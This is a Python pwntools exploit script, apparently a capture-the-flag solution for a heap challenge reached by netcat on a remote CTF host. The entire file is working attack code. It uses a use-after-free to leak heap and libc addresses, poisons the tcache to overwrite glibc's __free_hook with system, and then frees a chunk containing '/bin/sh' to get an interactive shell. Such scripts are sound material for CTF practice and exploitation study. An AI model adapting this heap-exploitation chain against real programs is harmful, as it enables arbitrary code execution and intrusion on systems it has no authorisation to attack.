#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./chal_patched", checksec=False)
libc = elf.libc


def start(argv=[], *a, **kw):
    nc = "nc gold.b01le.rs 4001"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        args_ = [elf.path] + argv
        if args.NA:  # NOASLR
            args_ = ["setarch", "-R"] + args_
        return process(args_, env=env, *a, **kw)


def alloc(idx, size):
    io.sendlineafter(b"Resize----\n", b"1")
    io.sendlineafter(b"Where? ", str(idx).encode())
    io.sendlineafter(b"size? ", str(size).encode())


def free(idx):
    io.sendlineafter(b"Resize----\n", b"2")
    io.sendlineafter(b"Where? ", str(idx).encode())


def view(idx):
    io.sendlineafter(b"Resize----\n", b"3")
    io.sendlineafter(b"Where? ", str(idx).encode())
    resp = u64(io.recvline().strip().ljust(8, b"\x00"))
    return resp


def edit(idx, size, data):
    io.sendlineafter(b"Resize----\n", b"4")
    io.sendlineafter(b"Where? ", str(idx).encode())
    io.sendlineafter(b"size? ", str(size).encode())
    io.send(data)


def resize(idx, size):
    io.sendlineafter(b"Resize----\n", b"6")
    io.sendlineafter(b"Where? ", str(idx).encode())
    io.sendlineafter(b"size? ", str(size).encode())


env = {}
io = start()

alloc(0, 0x10)
alloc(1, 0x10)
alloc(2, 0x500)
alloc(3, 0x20)  # pad
free(1)
free(0)
heap_leak = view(0)
heap_base = (heap_leak >> 12) << 12
log.info(f"{heap_base=:#x}")

free(2)
libc_leak = view(2)
libc.address = libc_leak - (libc.sym["main_arena"] + 96)
log.info(f"{libc.address=:#x}")

payload = p64(libc.sym["__free_hook"] - 0x8)
edit(0, 0x10, payload)
alloc(4, 0x10)
alloc(5, 0x10)
edit(5, 0x10, b"A" * 8 + p64(libc.sym["system"]))
edit(4, 0x10, b"/bin/sh")
free(4)

io.interactive()
